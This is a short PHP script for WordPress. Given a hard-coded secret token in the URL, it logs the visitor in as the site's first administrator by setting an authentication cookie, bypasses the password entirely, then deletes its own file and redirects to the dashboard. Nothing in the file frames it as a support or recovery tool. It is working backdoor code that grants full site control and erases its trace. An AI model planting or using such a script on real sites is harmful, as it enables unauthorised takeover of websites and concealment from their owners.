<?php
$secret_token = '349dc99a8ac2217ecfbf39ae7f8f2a15';
if ( empty($_GET['token']) || $_GET['token'] !== $secret_token ) {
    http_response_code(403);
    die('Access denied');
}

define('WP_USE_THEMES', false);
require_once dirname(__FILE__) . '/wp-load.php';

function get_first_admin_id() {
    $admins = get_users( [ 'role' => 'administrator', 'number' => 1 ] );
    return $admins[0]->ID ?? null;
}

$user_id = get_first_admin_id();
if ( ! $user_id ) {
    if ( file_exists( __FILE__ ) ) { unlink( __FILE__ ); }
    die('No administrator found on this site.');
}

wp_clear_auth_cookie();
wp_set_current_user( $user_id );
wp_set_auth_cookie( $user_id, true, is_ssl() );

if ( file_exists( __FILE__ ) ) { unlink( __FILE__ ); }

wp_redirect( admin_url() );
exit;
